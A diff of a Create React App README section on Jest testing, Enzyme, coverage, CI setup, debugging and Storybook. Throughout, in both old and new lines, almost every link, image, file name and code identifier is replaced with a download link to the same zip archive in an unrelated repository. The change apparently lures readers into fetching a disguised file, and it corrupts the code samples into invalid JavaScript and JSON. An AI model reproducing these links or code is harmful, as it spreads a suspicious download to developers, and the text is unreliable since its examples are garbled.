 When you encounter bugs caused by changing components, you will gain a deeper insight into which parts of them are worth testing in your application. This might be a good time to introduce more specific tests asserting specific expected output or behavior.
 
-If you’d like to test components in isolation from the child components they render, we recommend using [`shallow()` rendering API](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) from [Enzyme](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip). To install it, run:
+If you’d like to test components in isolation from the child components they render, we recommend using [`shallow()` rendering API](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) from [Enzyme](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip). To install it, run:
 
 ```sh
 npm install --save enzyme enzyme-adapter-react-16 react-test-renderer
@@ -1360,7 +1360,7 @@ As of Enzyme 3, you will need to install Enzyme along with an Adapter correspond
 
 The adapter will also need to be configured in your [global setup file](#initializing-test-environment):
 
-#### `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`
+#### `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`
 ```js
 import { configure } from 'enzyme';
 import Adapter from 'enzyme-adapter-react-16';
@@ -1368,7 +1368,7 @@ import Adapter from 'enzyme-adapter-react-16';
 configure({ adapter: new Adapter() });
 ```
 
->Note: Keep in mind that if you decide to "eject" before creating `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`, the resulting `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` file won't contain any reference to it. [Read here](#initializing-test-environment) to learn how to add this after ejecting.
+>Note: Keep in mind that if you decide to "eject" before creating `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`, the resulting `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` file won't contain any reference to it. [Read here](#initializing-test-environment) to learn how to add this after ejecting.
 
 Now you can write a smoke test with it:
 
@@ -1382,9 +1382,9 @@ it('renders without crashing', () => {
 });
 ```
 
-Unlike the previous smoke test using `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip()`, this test only renders `<App>` and doesn’t go deeper. For example, even if `<App>` itself renders a `<Button>` that throws, this test will pass. Shallow rendering is great for isolated unit tests, but you may still want to create some full rendering tests to ensure the components integrate correctly. Enzyme supports [full rendering with `mount()`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip), and you can also use it for testing state changes and component lifecycle.
+Unlike the previous smoke test using `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip()`, this test only renders `<App>` and doesn’t go deeper. For example, even if `<App>` itself renders a `<Button>` that throws, this test will pass. Shallow rendering is great for isolated unit tests, but you may still want to create some full rendering tests to ensure the components integrate correctly. Enzyme supports [full rendering with `mount()`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip), and you can also use it for testing state changes and component lifecycle.
 
-You can read the [Enzyme documentation](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) for more testing techniques. Enzyme documentation uses Chai and Sinon for assertions but you don’t have to use them because Jest provides built-in `expect()` and `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip()` for spies.
+You can read the [Enzyme documentation](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) for more testing techniques. Enzyme documentation uses Chai and Sinon for assertions but you don’t have to use them because Jest provides built-in `expect()` and `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip()` for spies.
 
 Here is an example from Enzyme documentation that asserts specific output, rewritten to use Jest matchers:
 
@@ -1396,15 +1396,15 @@ import App from './App';
 it('renders welcome message', () => {
   const wrapper = shallow(<App />);
   const welcome = <h2>Welcome to React</h2>;
-  // expect(https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip(welcome))https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip(true);
-  expect(https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip(welcome)).toEqual(true);
+  // expect(https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip(welcome))https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip(true);
+  expect(https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip(welcome)).toEqual(true);
 });
 ```
 
-All Jest matchers are [extensively documented here](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).<br>
-Nevertheless you can use a third-party assertion library like [Chai](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) if you want to, as described below.
+All Jest matchers are [extensively documented here](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).<br>
+Nevertheless you can use a third-party assertion library like [Chai](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) if you want to, as described below.
 
-Additionally, you might find [jest-enzyme](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) helpful to simplify your tests with readable matchers. The above `contains` code can be written more simply with jest-enzyme.
+Additionally, you might find [jest-enzyme](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) helpful to simplify your tests with readable matchers. The above `contains` code can be written more simply with jest-enzyme.
 
 ```js
 expect(wrapper).toContainReact(welcome)
@@ -1422,7 +1422,7 @@ Alternatively you may use `yarn`:
 yarn add jest-enzyme
 ```
 
-Import it in [`https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`](#initializing-test-environment) to make its matchers available in every test:
+Import it in [`https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`](#initializing-test-environment) to make its matchers available in every test:
 
 ```js
 import 'jest-enzyme';
@@ -1430,9 +1430,9 @@ import 'jest-enzyme';
 
 ### Using Third Party Assertion Libraries
 
-We recommend that you use `expect()` for assertions and `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip()` for spies. If you are having issues with them please [file those against Jest](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip), and we’ll fix them. We intend to keep making them better for React, supporting, for example, [pretty-printing React elements as JSX](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+We recommend that you use `expect()` for assertions and `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip()` for spies. If you are having issues with them please [file those against Jest](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip), and we’ll fix them. We intend to keep making them better for React, supporting, for example, [pretty-printing React elements as JSX](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
-However, if you are used to other libraries, such as [Chai](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) and [Sinon](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip), or if you have existing code using them that you’d like to port over, you can import them normally like this:
+However, if you are used to other libraries, such as [Chai](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) and [Sinon](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip), or if you have existing code using them that you’d like to port over, you can import them normally like this:
 
 ```js
 import sinon from 'sinon';
@@ -1445,26 +1445,26 @@ and then use them in your tests like you normally do.
 
 >Note: this feature is available with `react-scripts@0.4.0` and higher.
 
-If your app uses a browser API that you need to mock in your tests or if you just need a global setup before running your tests, add a `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` to your project. It will be automatically executed before running your tests.
+If your app uses a browser API that you need to mock in your tests or if you just need a global setup before running your tests, add a `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` to your project. It will be automatically executed before running your tests.
 
 For example:
 
-#### `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`
+#### `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`
 ```js
 const localStorageMock = {
-  getItem: https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip(),
-  setItem: https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip(),
-  clear: https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip()
+  getItem: https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip(),
+  setItem: https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip(),
+  clear: https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip()
 };
-https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip = localStorageMock
+https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip = localStorageMock
 ```
 
->Note: Keep in mind that if you decide to "eject" before creating `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`, the resulting `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` file won't contain any reference to it, so you should manually create the property `setupTestFrameworkScriptFile` in the configuration for Jest, something like the following:
+>Note: Keep in mind that if you decide to "eject" before creating `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`, the resulting `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` file won't contain any reference to it, so you should manually create the property `setupTestFrameworkScriptFile` in the configuration for Jest, something like the following:
 
 >```js
 >"jest": {
 >   // ...
->   "setupTestFrameworkScriptFile": "<rootDir>https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip"
+>   "setupTestFrameworkScriptFile": "<rootDir>https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip"
 >  }
 >  ```
 
@@ -1478,21 +1478,21 @@ Similarly, `fit()` lets you focus on a specific test without running any other t
 Jest has an integrated coverage reporter that works well with ES6 and requires no configuration.<br>
 Run `npm test -- --coverage` (note extra `--` in the middle) to include a coverage report like this:
 
-![coverage report](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+![coverage report](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 
 Note that tests run much slower with coverage so it is recommended to run it separately from your normal workflow.
 
 #### Configuration
 
-The default Jest coverage configuration can be overriden by adding any of the following supported keys to a Jest config in your https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip
+The default Jest coverage configuration can be overriden by adding any of the following supported keys to a Jest config in your https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip
 
 Supported overrides:
- - [`collectCoverageFrom`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
- - [`coverageReporters`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
- - [`coverageThreshold`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
- - [`snapshotSerializers`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+ - [`collectCoverageFrom`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
+ - [`coverageReporters`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
+ - [`coverageThreshold`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
+ - [`snapshotSerializers`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 
-Example https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip
+Example https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip
 
 ```json
 {
@@ -1528,8 +1528,8 @@ Popular CI servers already set the environment variable `CI` by default but you 
 ### On CI servers
 #### Travis CI
 
-1. Following the [Travis Getting started](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) guide for syncing your GitHub repository with Travis.  You may need to initialize some settings manually in your [profile](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) page.
-1. Add a `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` file to your git repository.
+1. Following the [Travis Getting started](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) guide for syncing your GitHub repository with Travis.  You may need to initialize some settings manually in your [profile](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) page.
+1. Add a `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` file to your git repository.
 ```
 language: node_js
 node_js:
@@ -1542,14 +1542,14 @@ script:
   - npm test
 ```
 1. Trigger your first build with a git push.
-1. [Customize your Travis CI Build](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) if needed.
+1. [Customize your Travis CI Build](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) if needed.
 
 #### CircleCI
 
-Follow [this article](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) to set up CircleCI with a Create React App project.
+Follow [this article](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) to set up CircleCI with a Create React App project.
 
 ### On your own environment
-##### Windows (https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+##### Windows (https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 
 ```cmd
 set CI=true&&npm test
@@ -1583,13 +1583,13 @@ CI=true npm run build
 
 The test command will force Jest to run tests once instead of launching the watcher.
 
->  If you find yourself doing this often in development, please [file an issue](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) to tell us about your use case because we want to make watcher the best experience and are open to changing how it works to accommodate more workflows.
+>  If you find yourself doing this often in development, please [file an issue](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) to tell us about your use case because we want to make watcher the best experience and are open to changing how it works to accommodate more workflows.
 
 The build command will check for linter warnings and fail if any are found.
 
 ### Disabling jsdom
 
-By default, the `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` of the generated project looks like this:
+By default, the `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` of the generated project looks like this:
 
 ```js
   "scripts": {
@@ -1598,7 +1598,7 @@ By default, the `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master
     "test": "react-scripts test --env=jsdom"
 ```
 
-If you know that none of your tests depend on [jsdom](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip), you can safely remove `--env=jsdom`, and your tests will run faster:
+If you know that none of your tests depend on [jsdom](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip), you can safely remove `--env=jsdom`, and your tests will run faster:
 
 ```diff
   "scripts": {
@@ -1611,36 +1611,36 @@ If you know that none of your tests depend on [jsdom](https://raw.githubusercont
 To help you make up your mind, here is a list of APIs that **need jsdom**:
 
 * Any browser globals like `window` and `document`
-* [`https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip()`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
-* [`https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip()`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) ([a shortcut](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) for the above)
-* [`mount()`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) in [Enzyme](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+* [`https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip()`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
+* [`https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip()`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) ([a shortcut](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) for the above)
+* [`mount()`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) in [Enzyme](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 
 In contrast, **jsdom is not needed** for the following APIs:
 
-* [`https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip()`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) (shallow rendering)
-* [`shallow()`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) in [Enzyme](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+* [`https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip()`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) (shallow rendering)
+* [`shallow()`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) in [Enzyme](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 
-Finally, jsdom is also not needed for [snapshot testing](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+Finally, jsdom is also not needed for [snapshot testing](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
 ### Snapshot Testing
 
-Snapshot testing is a feature of Jest that automatically generates text snapshots of your components and saves them on the disk so if the UI output changes, you get notified without manually writing any assertions on the component output. [Read more about snapshot testing.](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+Snapshot testing is a feature of Jest that automatically generates text snapshots of your components and saves them on the disk so if the UI output changes, you get notified without manually writing any assertions on the component output. [Read more about snapshot testing.](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 
 ### Editor Integration
 
-If you use [Visual Studio Code](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip), there is a [Jest extension](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) which works with Create React App out of the box. This provides a lot of IDE-like features while using a text editor: showing the status of a test run with potential fail messages inline, starting and stopping the watcher automatically, and offering one-click snapshot updates.
+If you use [Visual Studio Code](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip), there is a [Jest extension](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) which works with Create React App out of the box. This provides a lot of IDE-like features while using a text editor: showing the status of a test run with potential fail messages inline, starting and stopping the watcher automatically, and offering one-click snapshot updates.
 
-![VS Code Jest Preview](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+![VS Code Jest Preview](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 
 ## Debugging Tests
 
-There are various ways to setup a debugger for your Jest tests. We cover debugging in Chrome and [Visual Studio Code](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+There are various ways to setup a debugger for your Jest tests. We cover debugging in Chrome and [Visual Studio Code](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
 >Note: debugging tests requires Node 8 or higher.
 
 ### Debugging Tests in Chrome
 
-Add the following to the `scripts` section in your project's `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`
+Add the following to the `scripts` section in your project's `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`
 ```json
 "scripts": {
     "test:debug": "react-scripts --inspect-brk test --runInBand --env=jsdom"
@@ -1664,9 +1664,9 @@ After opening that link, the Chrome Developer Tools will be displayed. Select `i
 
 ### Debugging Tests in Visual Studio Code
 
-Debugging Jest tests is supported out of the box for [Visual Studio Code](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+Debugging Jest tests is supported out of the box for [Visual Studio Code](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
-Use the following [`https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) configuration file:
+Use the following [`https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) configuration file:
 ```
 {
   "version": "0.2.0",
@@ -1675,7 +1675,7 @@ Use the following [`https://raw.githubusercontent.com/kobmol/Tugas-Front-End/mas
       "name": "Debug CRA Tests",
       "type": "node",
       "request": "launch",
-      "runtimeExecutable": "${workspaceRoot}https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip",      
+      "runtimeExecutable": "${workspaceRoot}https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip",      
       "args": [
         "test",
         "--runInBand",
@@ -1702,9 +1702,9 @@ For an example, a simple button component could have following states:
 
 Usually, it’s hard to see these states without running a sample app or some examples.
 
-Create React App doesn’t include any tools for this by default, but you can easily add [Storybook for React](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) ([source](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)) or [React Styleguidist](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) ([source](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)) to your project. **These are third-party tools that let you develop components and see all their states in isolation from your app**.
+Create React App doesn’t include any tools for this by default, but you can easily add [Storybook for React](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) ([source](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)) or [React Styleguidist](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) ([source](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)) to your project. **These are third-party tools that let you develop components and see all their states in isolation from your app**.
 
-![Storybook for React Demo](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+![Storybook for React Demo](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 
 You can also deploy your Storybook or style guide as a static app. This way, everyone in your team can view and review different states of UI components without starting a backend server or creating an account in your app.
 
@@ -1728,10 +1728,10 @@ After that, follow the instructions on the screen.
 
 Learn more about React Storybook:
 
-* Screencast: [Getting Started with React Storybook](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
-* [GitHub Repo](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
-* [Documentation](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
-* [Snapshot Testing UI](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) with Storybook + addon/storyshot
+* Screencast: [Getting Started with React Storybook](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
+* [GitHub Repo](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
+* [Documentation](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
+* [Snapshot Testing UI](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) with Storybook + addon/storyshot
 
 ### Getting Started with Styleguidist
 
@@ -1749,7 +1749,7 @@ Alternatively you may use `yarn`:
 yarn add react-styleguidist
 ```
 
-Then, add these scripts to your `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`:
+Then, add these scripts to your `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`:
 
 ```diff
    "scripts": {
@@ -1768,17 +1768,17 @@ After that, follow the instructions on the screen.
 
 Learn more about React Styleguidist:
 
-* [GitHub Repo](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
-* [Documentation](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+* [GitHub Repo](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
+* [Documentation](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 
 ## Publishing Components to npm
 
-Create React App doesn't provide any built-in functionality to publish a component to npm. If you're ready to extract a component from your project so other people can use it, we recommend moving it to a separate directory outside of your project and then using a tool like [nwb](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) to prepare it for publishing.
+Create React App doesn't provide any built-in functionality to publish a component to npm. If you're ready to extract a component from your project so other people can use it, we recommend moving it to a separate directory outside of your project and then using a tool like [nwb](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) to prepare it for publishing.
 
 ## Making a Progressive Web App
 
 By default, the production build is a fully functional, offline-first
-[Progressive Web App](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+[Progressive Web App](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
 Progressive Web Apps are faster and more reliable than traditional web pages, and provide an engaging mobile experience:
 
@@ -1786,11 +1786,11 @@ Progressive Web Apps are faster and more reliable than traditional web pages, an
  * Your app will work regardless of network state, even if offline. This means your users will be able to use your app at 10,000 feet and on the subway.
  * On mobile devices, your app can be added directly to the user's home screen, app icon and all. You can also re-engage users using web **push notifications**. This eliminates the need for the app store.
 
-The [`sw-precache-webpack-plugin`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+The [`sw-precache-webpack-plugin`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 is integrated into production configuration,
 and it will take care of generating a service worker file that will automatically
 precache all of your local assets and keep them up to date as you deploy updates.
-The service worker will use a [cache-first strategy](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+The service worker will use a [cache-first strategy](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 for handling all requests for local assets, including the initial HTML, ensuring
 that your web app is reliably fast, even on a slow or unreliable network.
 
